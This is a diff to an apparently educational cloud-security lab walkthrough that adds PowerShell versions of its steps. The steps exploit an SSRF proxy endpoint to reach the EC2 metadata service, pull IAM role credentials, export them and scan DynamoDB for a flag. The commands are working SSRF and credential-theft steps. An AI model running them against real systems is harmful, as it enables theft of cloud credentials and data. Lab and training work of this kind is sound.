@@ -80,7 +80,8 @@ You should receive the HTML content from example.com.
 Query the metadata service to find the IAM role name:
 
 ```bash
-curl "http://<public_ip>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "http://<public_ip>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" #Kali
+Invoke-RestMethod -Uri "http://<EC2_PUBLIC_IP>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" #Powershell Admin mode
 ```
 
 Response should be: `EC2-Web-Role`
@@ -89,10 +90,13 @@ Now retrieve the IAM credentials:
 
 ```bash
 curl "http://<public_ip>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Web-Role"
+$creds = Invoke-RestMethod -Uri "http://<EC2_PUBLIC_IP>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Web-Role"
 ```
+# View the keys in your terminal
+$creds | ConvertTo-Json  #For Windows
 
 This returns temporary AWS credentials:
-```json
+```json 
 {
   "AccessKeyId": "ASIA...",
   "SecretAccessKey": "...",
@@ -103,7 +107,7 @@ This returns temporary AWS credentials:
 
 ### Step 3: Use Stolen Credentials to Access DynamoDB
 
-Export the stolen credentials:
+Export the stolen credentials: Replace with your credentials
 
 ```bash
 export AWS_ACCESS_KEY_ID="<AccessKeyId>"
@@ -111,7 +115,7 @@ export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
 export AWS_SESSION_TOKEN="<Token>"
 export AWS_DEFAULT_REGION="us-east-1"
 ```
-
+Confirm temporal credentials:  aws sts get-caller-identity
 Scan the DynamoDB table to retrieve the flag:
 
 ```bash
